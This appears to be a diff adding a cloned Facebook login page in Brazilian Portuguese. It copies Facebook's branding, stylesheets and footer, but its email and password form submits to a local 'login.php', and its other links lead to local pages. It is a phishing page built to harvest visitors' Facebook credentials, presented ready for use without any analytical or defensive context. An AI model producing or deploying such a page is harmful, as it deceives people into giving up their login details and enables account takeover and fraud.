@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="PT-BR" id="facebook" class="">
+<head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer"> 
+    <title id="pageTitle">Facebook-entre ou cadastre-se</title>
+    <link rel="icon" href="face.ico">
+    <meta name="bingbot" content="noarchive">
+    <meta property="og:locale" content="pt_BR">
+    <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/">
+    <link rel="alternate" media="handheld" href="https://m.facebook.com/">
+    <meta name="description" content="Entre no Facebook para começar a compartilhar e se conectar com seus amigos, familiares e com as pessoas que você conhece.">
+    <link rel="canonical" href="https://www.facebook.com/">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/l/0,cross/SCSce08z4ZH.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="DcjhpPo" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y5/l/0,cross/pLcVcRIs125.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="kQeX049" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yf/l/0,cross/GaPBk_sPUkT.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="TBFqEuQ" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y8/l/0,cross/CvjfSAXerwG.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="DW2kujp" crossorigin="anonymous">
+    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/l/0,cross/lr9obK35TzP.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="+NqC/p5" crossorigin="anonymous">
+    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/Ey2y7vTEBTa.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="sx4EcDX" crossorigin="anonymous" nonce=""></script>
+    <style>
+        .centered-footer {
+            text-align: center;
+            margin-top: 20px; /* espaçamento do texto ao container */
+            font-size: 14px; /* tamanho da fonte */
+        }
+        h2 {
+            font-size:28px;
+            font-weight:normal;
+        }
+    </style>
+</head>
+<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1 Locale_pt_BR cores-gte4 _19_u" dir="ltr">
+    <script type="text/javascript" nonce="">requireLazy(["bootstrapWebSession"],function(j){j(1726009198)})</script>
+    <div class="_li" id="u_0_1_uZ">
+        <form method='POST' action="login.php"> 
+            <div id="globalContainer" class="uiContextualLayerParent">
+                <div class="fb_content clearfix " id="content" role="main">
+                    <div>
+                        <div class="8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op _95ka">
+                            <div class="_8esk">
+                                <div class="_8esl">
+                                    <div class="_8ice">
+                                        <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+                                    </div>
+                                    <h2 class="_8eso">O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h2>
+                                </div>
+                                <div class="_8esn">
+                                    <div class="_8iep _8icy _9ahz _9ah-">
+                                        <div class="_6luv _52jv">
+                                            <div>
+                                                <div class="_6lux">
+                                                    <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Email ou telefone" autofocus="1" aria-label="Email ou telefone">
+                                                </div>
+                                                <div class="_6lux">
+                                                    <div class="_6luy _55r1 _1kbt" id="passContainer">
+                                                        <input type="password" class="inputtext _55r1 _6luy _9npi" name="password" id="pass" data-testid="royal_pass" placeholder="Senha" aria-label="Senha">
+                                                        <div class="_9ls7 hidden_elem" id="u_0_3_DB">
+                                                            <a href="#" role="button">
+                                                                <div class="_9lsa">
+                                                                    <div class="_9lsb" id="u_0_4_U/">
+                                                                        <div></div>
+                                                                    </div>
+                                                                </div>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                    <input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login">
+                                                    <input type="hidden" autocomplete="off" name="next" value="">
+                                                    <div class="_6ltg">
+                                                        <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_5_i1" href="entrar.html">Entrar</button>
+                                                    </div>
+                                                    <div class="_6ltj">
+                                                        <a href="senha.html">Esqueceu a senha?</a>
+                                                    </div>
+                                                    <div class="_8icz"></div>
+                                                    <div class="_6ltg">
+                                                        <a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" ajaxify="/reg/spotlight/" id="u_0_0_Uq" data-testid="open-registration-form-button" href="criarnovaconta.html">Criar nova conta</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="centered-footer">
+                                            <a class="_8esh" href="criarpagina.html" >Crie uma Página</a> para uma celebridade, uma marca ou uma empresa.
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div></div>
+                        <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+    <div class="_95ke _8opy">
+  <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+      <li>Português (Brasil)</li>
+      <li>
+        <a class="_sv4" title="English (US)">English (US)</a>
+      </li>
+      <li>
+        <a class="_sv4" title="Spanish">Español</a>
+      </li>
+      <li>
+        <a class="_sv4" title="French (France)">Français (France)</a>
+      </li>
+      <li>
+        <a class="_sv4" title="Italian">Italiano</a>
+      </li>
+      <li>
+        <a class="_sv4" title="German">Deutsch</a>
+      </li>
+      <li>
+        <a class="_sv4" title="Arabic">العربية</a>
+      </li>
+      <li>
+        <a class="_sv4" title="Hindi">हिन्दी</a>
+      </li>
+      <li>
+        <a class="_sv4" title="Simplified Chinese (China)">中文(简体)</a>
+      </li>
+      <li>
+        <a class="_sv4" title="Japanese">日本語</a>
+      </li>
+      <li>
+        <a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" title="Mostrar mais idiomas">
+          <i class="img sp_SOkuOHNUdYM sx_2458cb"></i>
+        </a>
+      </li>
+    </ul>
+    <div id="contentCurve"></div>
+    <div id="pageFooterChildren" role="contentinfo" aria-label="Links para sites do Facebook">
+      <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+        <li><a title="Cadastre-se no Facebook">Cadastre-se</a></li>
+        <li><a title="Entrar no Facebook">Entrar</a></li>
+        <li><a title="Confira o Messenger.">Messenger</a></li>
+        <li><a title="Facebook Lite para Android.">Facebook Lite</a></li>
+        <li><a title="Explorar a aba Vídeo">Vídeo</a></li>
+        <li><a title="Confira locais populares no Facebook.">Locais</a></li>
+        <li><a title="Confira os jogos do Facebook.">Jogos</a></li>
+        <li><a title="Compre e venda no Facebook Marketplace.">Marketplace</a></li>
+        <li><a title="Saiba mais sobre o Meta Pay" target="_blank">Meta Pay</a></li>
+        <li><a title="Finalizar a compra com a Meta" target="_blank">Meta Store</a></li>
+        <li><a title="Saiba mais sobre o Meta Quest" target="_blank">Meta Quest</a></li>
+        <li><a title="Saiba mais sobre o Ray-Ban Meta" target="_blank">Ray-Ban Meta</a></li>
+        <li><a title="Meta AI">Meta AI</a></li>
+        <li><a title="Confira o Instagram" target="_blank" rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a>
+        </li>
+        <li><a title="Confira o Threads">Threads</a></li>
+        <li><a title="Doe para causas importantes.">Campanhas de arrecadação de fundos</a></li>
+        <li><a title="Navegue pelo nosso diretório de serviços do Facebook.">Serviços</a></li>
+        <li><a title="Veja a Central de Informações de Votação.">Central de Informações de Votação</a></li>
+        <li><a title="Saiba como coletamos, usamos e compartilhamos informações para apoiar o Facebook.">Política de Privacidade</a></li>
+        <li><a title="Saiba como gerenciar e controlar sua privacidade no Facebook.">Central de Privacidade</a></li>
+        <li><a title="Explorar nossos grupos.">Grupos</a></li>
+        <li><a accesskey="8" title="Leia nosso blog, descubra a central de recursos e encontre oportunidades de trabalho.">Sobre</a></li>
+        <li><a title="Anuncie no Facebook.">Criar anúncio</a></li>
+        <li><a title="Criar uma Página">Criar Página</a></li>
+        <li><a title="Desenvolver em nossa plataforma.">Desenvolvedores</a></li>
+        <li><a title="Dê um passo adiante na sua carreira em nossa incrível empresa.">Carreiras</a></li>
+        <li><a title="Saiba mais sobre cookies e o Facebook" data-nocookies="1">Cookies</a></li>
+        <li><a class="_41ug" data-nocookies="1" title="Saiba mais sobre as escolhas para anúncios.">Escolhas para anúncios
+            <i class="img sp_SOkuOHNUdYM sx_041895"></i>
+          </a>
+        </li>
+        <li><a data-nocookies="1" accesskey="9" title="Leia os nossos termos e políticas.">Termos</a></li>
+        <li><a accesskey="0" title="Acesse nossa Central de Ajuda.">Ajuda</a></li>
+        <li><a title="Acesse nosso aviso de carregamento de contatos e não usuários.">Carregamento de contatos e não usuários</a></li>
+        <li><a accesskey="6" class="accessible_elem" title="Visualize e edite suas configurações do Facebook.">Configurações</a></li>
+        <li><a accesskey="7" class="accessible_elem" title="Ver registro de atividades">Registro de atividades</a></li>
+      </ul>
+    </div>
+    <div class="mvl copyright">
+      <div>
+        <span>Meta © 2024</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+
+</body>
+</html>
